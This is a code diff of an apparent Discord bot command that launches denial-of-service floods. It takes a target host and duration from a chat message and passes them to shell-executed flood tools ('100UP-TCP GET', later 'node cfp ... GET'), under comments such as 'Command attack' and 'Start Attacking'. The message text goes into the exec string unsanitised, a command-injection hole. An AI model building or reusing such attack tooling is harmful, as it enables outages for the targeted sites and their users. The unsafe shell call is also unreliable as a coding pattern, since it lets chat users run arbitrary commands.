@@ -6,9 +6,8 @@ const libquery = require("libquery");
 exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
-const port = message.content.split (" ")[2]
-const time = message.content.split (" ")[3]
-const api = message.content.split (" ")[4]
+const time = message.content.split (" ")[2]
+const api = message.content.split (" ")[3]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -56,7 +55,7 @@ if(!args[0]) {
     message.channel.send(Warn("🚫 the api is out of tune ! 🚫"));
     return;
   }
-  if (isLetter(port)) {
+  if (isLetter(time)) {
     message.channel.send(Warn("time cannot contain characters!"));
     return;
   }
@@ -73,7 +72,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`./100UP-TCP GET ${host} ${port} ${time} 20000`, (error, stdout, stderr) => {
+exec(`node cfp ${host} 10 300 GET ${time}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
